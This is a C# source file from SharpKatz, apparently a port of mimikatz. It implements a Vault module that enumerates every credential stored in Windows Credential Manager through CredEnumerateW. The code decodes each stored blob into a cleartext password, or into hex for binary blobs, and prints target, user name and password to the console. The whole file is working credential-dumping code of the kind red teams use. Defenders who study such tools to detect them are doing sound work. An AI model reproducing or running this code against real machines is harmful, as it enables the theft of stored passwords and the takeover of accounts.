using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    /// <summary>
    /// Windows Credential Manager (vault) enumeration.
    /// Equivalent to mimikatz vault::list / vault::cred.
    /// Uses CredEnumerate to list stored credentials (Generic, DomainPassword, etc.).
    /// </summary>
    internal static class Vault
    {
        // Credential types
        private const int CRED_TYPE_GENERIC = 1;
        private const int CRED_TYPE_DOMAIN_PASSWORD = 2;
        private const int CRED_TYPE_DOMAIN_CERTIFICATE = 3;
        private const int CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4;
        private const int CRED_TYPE_GENERIC_CERTIFICATE = 5;
        private const int CRED_TYPE_DOMAIN_EXTENDED = 6;

        // Persist types
        private const int CRED_PERSIST_SESSION = 1;
        private const int CRED_PERSIST_LOCAL_MACHINE = 2;
        private const int CRED_PERSIST_ENTERPRISE = 3;

        // Enumerate flags
        private const int CRED_ENUMERATE_ALL_CREDENTIALS = 0x1;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CREDENTIAL
        {
            public uint Flags;
            public uint Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public uint CredentialBlobSize;
            public IntPtr CredentialBlob;
            public uint Persist;
            public uint AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }

        public struct VaultEntry
        {
            public string TargetName;
            public string UserName;
            public string Password;
            public string Type;
            public string Persist;
            public string Comment;
        }

        /// <summary>
        /// Enumerate all credentials from Windows Credential Manager.
        /// </summary>
        public static List<VaultEntry> ListCredentials()
        {
            var results = new List<VaultEntry>();

            IntPtr pCredentials = IntPtr.Zero;
            int count = 0;

            // Try enumerating all credentials
            bool success = CredEnumerateW(null, CRED_ENUMERATE_ALL_CREDENTIALS, ref count, ref pCredentials);
            if (!success)
            {
                // Fallback: try without the ALL flag (older Windows versions)
                success = CredEnumerateW(null, 0, ref count, ref pCredentials);
            }

            if (!success || count == 0)
            {
                Console.WriteLine("  No credentials found in Credential Manager");
                return results;
            }

            try
            {
                for (int i = 0; i < count; i++)
                {
                    IntPtr pCred = Marshal.ReadIntPtr(pCredentials, i * IntPtr.Size);
                    CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(pCred, typeof(CREDENTIAL));

                    VaultEntry entry = new VaultEntry();
                    entry.TargetName = cred.TargetName != IntPtr.Zero ? Marshal.PtrToStringUni(cred.TargetName) : "";
                    entry.UserName = cred.UserName != IntPtr.Zero ? Marshal.PtrToStringUni(cred.UserName) : "";
                    entry.Comment = cred.Comment != IntPtr.Zero ? Marshal.PtrToStringUni(cred.Comment) : "";
                    entry.Type = GetCredTypeName(cred.Type);
                    entry.Persist = GetPersistName(cred.Persist);

                    // Extract credential blob (password)
                    if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                    {
                        // Try as Unicode string first (most common for domain passwords)
                        if (cred.Type == CRED_TYPE_DOMAIN_PASSWORD ||
                            cred.Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD)
                        {
                            entry.Password = Marshal.PtrToStringUni(cred.CredentialBlob,
                                (int)cred.CredentialBlobSize / 2);
                        }
                        else if (cred.Type == CRED_TYPE_GENERIC)
                        {
                            // Generic credentials may be text or binary
                            try
                            {
                                string text = Marshal.PtrToStringUni(cred.CredentialBlob,
                                    (int)cred.CredentialBlobSize / 2);
                                // Check if it looks like printable text
                                bool isPrintable = true;
                                foreach (char c in text)
                                {
                                    if (c != 0 && (c < 0x20 || c > 0x7E) && c != '\r' && c != '\n' && c != '\t')
                                    {
                                        isPrintable = false;
                                        break;
                                    }
                                }
                                entry.Password = isPrintable ? text : BytesToHex(cred.CredentialBlob, cred.CredentialBlobSize);
                            }
                            catch
                            {
                                entry.Password = BytesToHex(cred.CredentialBlob, cred.CredentialBlobSize);
                            }
                        }
                        else
                        {
                            entry.Password = BytesToHex(cred.CredentialBlob, cred.CredentialBlobSize);
                        }
                    }

                    results.Add(entry);
                }
            }
            finally
            {
                CredFree(pCredentials);
            }

            return results;
        }

        /// <summary>
        /// Print all vault entries to console.
        /// </summary>
        public static void PrintCredentials()
        {
            List<VaultEntry> entries = ListCredentials();

            if (entries.Count == 0) return;

            Console.WriteLine("\n  Credential Manager ({0} entries):\n", entries.Count);

            foreach (VaultEntry entry in entries)
            {
                Console.WriteLine("    Target   : {0}", entry.TargetName);
                Console.WriteLine("    Type     : {0}", entry.Type);
                Console.WriteLine("    User     : {0}", entry.UserName);
                if (!string.IsNullOrEmpty(entry.Password))
                    Console.WriteLine("    Password : {0}", entry.Password);
                if (!string.IsNullOrEmpty(entry.Comment))
                    Console.WriteLine("    Comment  : {0}", entry.Comment);
                Console.WriteLine("    Persist  : {0}", entry.Persist);
                Console.WriteLine();
            }
        }

        private static string GetCredTypeName(uint type)
        {
            switch (type)
            {
                case CRED_TYPE_GENERIC: return "Generic";
                case CRED_TYPE_DOMAIN_PASSWORD: return "DomainPassword";
                case CRED_TYPE_DOMAIN_CERTIFICATE: return "DomainCertificate";
                case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "DomainVisiblePassword";
                case CRED_TYPE_GENERIC_CERTIFICATE: return "GenericCertificate";
                case CRED_TYPE_DOMAIN_EXTENDED: return "DomainExtended";
                default: return "Unknown(" + type + ")";
            }
        }

        private static string GetPersistName(uint persist)
        {
            switch (persist)
            {
                case CRED_PERSIST_SESSION: return "Session";
                case CRED_PERSIST_LOCAL_MACHINE: return "LocalMachine";
                case CRED_PERSIST_ENTERPRISE: return "Enterprise";
                default: return "Unknown(" + persist + ")";
            }
        }

        private static string BytesToHex(IntPtr ptr, uint length)
        {
            byte[] data = new byte[length];
            Marshal.Copy(ptr, data, 0, (int)length);
            StringBuilder sb = new StringBuilder((int)length * 2);
            foreach (byte b in data)
                sb.AppendFormat("{0:x2}", b);
            return sb.ToString();
        }

    }
}
